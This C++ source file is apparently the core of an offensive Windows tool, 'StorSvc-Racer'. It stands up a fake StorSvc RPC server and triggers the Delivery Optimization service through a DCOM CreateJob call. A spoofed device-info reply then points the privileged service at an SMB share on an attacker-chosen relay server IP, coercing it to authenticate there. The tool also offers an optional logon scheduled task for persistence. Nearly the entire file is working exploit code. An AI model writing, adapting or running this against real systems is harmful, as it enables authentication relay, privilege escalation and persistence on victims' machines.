#include "StorSvc-Racer.h"

// Delivery Optimization service is a DCOM server
// Invoking IBackgroundCopyJob::CreateJob will cause it to call StorageUsage.dll!GetStorageDeviceInfo and connect to our RPC server
void TriggerCreateJob(LPCWSTR JobName)
{
	HRESULT hr = S_OK;
	hr = CoInitialize(nullptr);
	if (FAILED(hr))
		ThrowException("CoInitialize failed", hr);

	IBackgroundCopyManager* copyManager = nullptr;
	hr = CoCreateInstance(CLSID_DeliveryOptimization,
		nullptr,
		CLSCTX_LOCAL_SERVER,
		IID_IBackgroundCopyManager,
		reinterpret_cast<void**>(&copyManager));

	if (FAILED(hr))
	{
		CoUninitialize();
		ThrowException("CoCreateInstance for IID_IBackgroundCopyManager failed", hr);
	}

	GUID guid = {};
	IBackgroundCopyJob* copyJob = nullptr;
	hr = copyManager->CreateJob(JobName, BG_JOB_TYPE_DOWNLOAD, &guid, &copyJob);
	copyManager->Release();
	if (FAILED(hr))
	{
		CoUninitialize();
		ThrowException("IBackgroundCopyManager::CreateJob failed", hr);
	}
	wcout << L"Job created: " << UuidToWstring(&guid) << endl;
	copyJob->Complete();
	copyJob->Release();
}

void PrintHelp()
{
	wcout << "usage: StorSvc-Racer.exe RELAY_SERVER_IP_ADDRESS [" << REGISTER_FLAG << L"]" << endl;
}

int wmain(int argc, wchar_t* argv[])
{
	try 
	{
		wstring param1, param2;
		switch (argc)
		{
		case 1:
			PrintHelp();
			return EXIT_SUCCESS;
		case 2:
			param1 = argv[1];
			break;
		default:
			param1 = argv[1];
			param2 = argv[2];
		}

		if (!param1.compare(L"-h") || !param1.compare(L"--help"))
		{
			PrintHelp();
			return EXIT_SUCCESS;
		}

		// The first parameter is the IP address of the relay server
		g_RemoteServer = param1;

		// The second parameter is optinal. It can be given to register a scheduled task that executes when the current user logs on
		if (!param2.empty())
		{
			if (!param2.compare(REGISTER_FLAG))
			{
				RegisterScheduledTask(TASK_NAME, g_RemoteServer, false);
				return EXIT_SUCCESS;
			}
			else
			{
				wcout << L"invalid parameter" << endl;
				PrintHelp();
				return EXIT_SUCCESS;
			}
		}
		
		wchar_t protseq[] = PROTSEC;
		RegisterServer(StorSvc_v0_0_s_ifspec, protseq, nullptr, nullptr);
		wstring serviceName = L"StorSvc";
		QueryStatusService(serviceName);
		TriggerCreateJob(L"Job");
		RPC_STATUS rpcStatus = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
		if (RPC_S_OK != rpcStatus)
			ThrowException("RpcServerListen failed", rpcStatus);
	}
	catch (std::exception& ex)
	{
		cout << ex.what() << endl;
	}
	catch (...)
	{
		cout << "Unknown exception occured" << endl;
	}
	cout << "Done" << endl;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}

long SvcMountVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcMountVolume called" << endl; return 0;
}

long SvcDismountVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcDismountVolume called" << endl; return 0;
}

long SvcFormatVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcFormatVolume called" << endl; return 0;
}

long SvcGetStorageInstanceCount(
	/* [in] */ handle_t IDL_handle,
	/* [in] */ STORAGE_DEVICE_TYPE DeviceType,
	/* [out] */ LPDWORD DevicesCount) {
	wcout << L"SvcGetStorageInstanceCount called" << endl;
	
	// Return specific values that will cause dosvc.dll!CServiceCallback::GetAppInstallPath to call GetStorageDeviceInfo
	*DevicesCount = 1;
	return 0;
}

long SvcGetStorageDeviceInfo(
	/* [in] */ handle_t IDL_handle,
	/* [in] */ STORAGE_DEVICE_TYPE DeviceType,
	/* [in] */ DWORD DeviceIndex,
	/* [out][in] */ STORAGE_DEVICE_INFO* DeviceInfo) {
	wcout << L"SvcGetStorageDeviceInfo called" << endl;

	// Fill the buffer of DeviceInfo with zeros except for the first property - Size
	memset(&DeviceInfo->PathName[0], 0, sizeof(STORAGE_DEVICE_INFO) - sizeof(unsigned int));

	// Write an SMB share to DeviceInfo->PathName
	wstring pathName = L"\\\\";
	pathName.append(g_RemoteServer);
	pathName.append(L"\\Share");
	wcout << L"Setting DeviceInfo->PathName to: " << pathName << endl;
	wcsncpy_s(DeviceInfo->PathName, sizeof(DeviceInfo->PathName) / sizeof(wchar_t), pathName.c_str(), pathName.size());

	// Return specific values to pass the checks made by dosvc.dll!CServiceCallback::GetAppInstallPath
	DeviceInfo->DeviceProperties = STORAGE_PROPERTY_NONE;
	DeviceInfo->PresenceState = STORAGE_PRESENCE_MOUNTED;
	DeviceInfo->VolumeStatus = STORAGE_STATUS_NORMAL;
	return 0;
}

long CleanupItem(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"CleanupItem called" << endl; return 0;
}

long SvcRebootToFlashingMode(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcRebootToFlashingMode called" << endl; return 0;
}

long SvcRebootToUosFlashing(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcRebootToUosFlashing called" << endl; return 0;
}

long SvcFinalizeVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcFinalizeVolume called" << endl; return 0;
}

long SvcGetStorageSettings(
	/* [in] */ handle_t IDL_handle,
	/* [in] */ STORAGE_DEVICE_TYPE DeviceType,
	/* [in] */ DWORD DeviceIndex,
	/* [in] */ STORAGE_SETTING SettingsType,
	/* [out] */ LPDWORD SettingsValue) {
	wcout << L"SvcGetStorageSettings called" << endl;

	// Return specific values that will cause dosvc.dll!CServiceCallback::GetAppInstallPath to call GetStorageDeviceInfo
	*SettingsValue = 0x10;
	return 0;
}

long SvcResetStoragePolicySettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcResetStoragePolicySettings called" << endl; return 0;
}

long SvcSetStorageSettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSetStorageSettings called" << endl; return 0;
}

long SvcTriggerStorageCleanup(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerStorageCleanup called" << endl; return 0;
}

long SvcTriggerLowStorageNotification(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerLowStorageNotification called" << endl; return 0;
}

long SvcMoveFileInheritSecurity(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcMoveFileInheritSecurity called" << endl; return 0;
}

long SvcScanVolume(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcScanVolume called" << endl; return 0;
}

long SvcProcessStorageCardChange(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcProcessStorageCardChange called" << endl; return 0;
}

long SvcProvisionForAppInstall(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcProvisionForAppInstall called" << endl; return 0;
}

long SvcGetStorageInstanceCountForMaps(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageInstanceCountForMaps called" << endl; return 0;
}

long SvcGetStoragePolicySettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStoragePolicySettings called" << endl; return 0;
}

long SvcSetStoragePolicySettings(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSetStoragePolicySettings called" << endl; return 0;
}

long SvcTriggerStoragePolicies(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerStoragePolicies called" << endl; return 0;
}

long SvcTriggerStorageOptimization(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcTriggerStorageOptimization called" << endl; return 0;
}

long SvcPredictStorageHealth(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcPredictStorageHealth called" << endl; return 0;
}

long SvcGetLastFailedSaveLocationPath(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetLastFailedSaveLocationPath called" << endl; return 0;
}

long SvcExecuteRemoveUserFiles(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcExecuteRemoveUserFiles called" << endl; return 0;
}

long SvcExecuteDehydrateUserFiles(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcExecuteDehydrateUserFiles called" << endl; return 0;
}

long SvcGetStorageDeviceSize(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageDeviceSize called" << endl; return 0;
}

long SvcGetStoragePolicyDefaultValue(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStoragePolicyDefaultValue called" << endl; return 0;
}

long SvcGetStorageDeviceLowDiskState(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageDeviceLowDiskState called" << endl; return 0;
}

long SvcGetStorageDeviceLowDiskState2(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStorageDeviceLowDiskState2 called" << endl; return 0;
}

long SvcSilentCleanupTaskSetEnabledState(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSilentCleanupTaskSetEnabledState called" << endl; return 0;
}

long SvcSilentCleanupTaskGetEnabledState(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSilentCleanupTaskGetEnabledState called" << endl; return 0;
}

long SvcGetStoragePoliciesLastTriggerTime(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetStoragePoliciesLastTriggerTime called" << endl; return 0;
}

long SvcSetStoragePoliciesLastTriggerTime(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcSetStoragePoliciesLastTriggerTime called" << endl; return 0;
}

long SvcGetSmartAttributes(
	/* [in] */ handle_t IDL_handle) {
	wcout << L"SvcGetSmartAttributes called" << endl; return 0;
}